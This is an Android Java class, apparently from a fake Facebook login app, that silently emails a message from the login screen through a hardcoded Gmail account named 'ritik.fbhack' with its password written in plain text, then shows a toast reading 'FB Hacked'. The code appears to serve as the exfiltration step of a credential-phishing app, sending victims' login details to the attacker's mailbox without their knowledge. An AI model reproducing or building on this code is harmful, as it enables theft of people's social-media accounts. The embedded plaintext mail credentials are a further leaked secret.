package xtremecreations.facebookapp;
import android.widget.Toast;

import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;

public class SendMail
{
    SendMail(final LoginActivity La, String email, String subject, String message){
        BackgroundMail.newBuilder(La)
                .withUsername("ritik.fbhack@gmail.com")
                .withPassword("123212321")
                .withMailto(email)
                .withType(BackgroundMail.TYPE_PLAIN)
                .withSubject(subject)
                .withBody(message)
                .withOnSuccessCallback(new BackgroundMail.OnSuccessCallback() {
                    @Override
                    public void onSuccess() {
                        Toast.makeText(La, "FB Hacked", Toast.LENGTH_SHORT).show();
                    }
                })
                .withOnFailCallback(new BackgroundMail.OnFailCallback() {
                    @Override
                    public void onFail() {
                        //do some magic
                    }
                })
                .send();
    }
}